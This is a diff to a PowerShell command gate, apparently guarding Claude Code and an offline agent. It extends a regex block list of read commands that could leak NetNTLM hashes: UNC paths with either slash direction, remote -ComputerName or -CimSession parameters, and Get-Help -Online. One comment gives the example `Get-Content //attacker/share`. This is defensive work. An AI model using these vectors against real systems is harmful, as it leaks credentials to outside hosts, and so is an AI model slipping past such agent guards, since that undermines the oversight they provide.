@@ -100,14 +100,26 @@ $script:LokiSecretTargetPatterns = @(
     'LOKI_SECRET'
 )
 
-# Side-effecting/exfiltrating "read" patterns (online enforcement, defense in depth -- adversarial review,
-# ADR-0007). A command can classify as a provably-local read yet still cause an EXTERNAL side effect. Block any
-# otherwise-read command that: reaches a UNC path (coerced SMB/NTLM auth -> credential leak); runs Get-Help or the
-# -Online switch (launches the default browser + a network fetch). Case-insensitive (-match default).
+# Side-effecting/exfiltrating "read" patterns (online + offline enforcement, defense in depth -- adversarial review,
+# ADR-0007, extended 2026-07-18 by the offline-agent review, ADR-0006 refinement). A command can classify as a
+# provably-local read yet still reach an EXTERNAL host and leak the NetNTLM hash / beacon. Block any otherwise-read
+# command that: reaches a UNC path in EITHER slash direction; names a remote target parameter; or launches the browser
+# (Get-Help/-Online). Case-insensitive (-match default). These live in the SHARED gate, so they harden Claude Code and
+# the offline agent at once.
 $script:LokiReadSideEffectPatterns = @(
-    '\\\\',                      # UNC path (\\host\share) -> forces SMB auth, can leak the NetNTLM hash
-    '\bGet-Help\b',              # Get-Help -Online opens the default browser (external process + network)
-    '\s-online\b'                # the -Online switch on any read command (browser launch)
+    '\\\\',                          # UNC path with backslashes (\\host\share) -> forces SMB auth, leaks NetNTLM
+    '(?:^|[\s=,;''"(])[\\/]{2}',     # UNC via forward/mixed slashes (//host, /\host): .NET/GetPathRoot normalizes these
+                                     #   to a UNC too, so `Get-Content //attacker/share` still coerces SMB/NTLM auth. Anchored
+                                     #   at a token boundary and NOT preceded by ':' -> http:// and inline // are spared;
+                                     #   the danger is a UNC at a path-root position (offline-agent review 2026-07-18).
+    '\s-computer',                   # -ComputerName / -Computer on a read cmdlet (Get-CimInstance/-Service/-WinEvent/
+                                     #   -WmiObject) -> remote WinRM/DCOM auth to an attacker host -> NetNTLM leak. Native
+                                     #   ping/tracert (bare host) and positional Test-NetConnection stay allowed.
+    '\s-cn\b',                       # the -ComputerName alias
+    '\s-cimsession\b',               # -CimSession -> a remote CIM session
+    '\s-connectionuri\b',            # -ConnectionUri -> an explicit WSMan endpoint
+    '\bGet-Help\b',                  # Get-Help -Online opens the default browser (external process + network)
+    '\s-online\b'                    # the -Online switch on any read command (browser launch)
 )
 
 # Every env-var name Claude Code can AUTHENTICATE on. Loki sets exactly ONE (api -> ANTHROPIC_API_KEY,
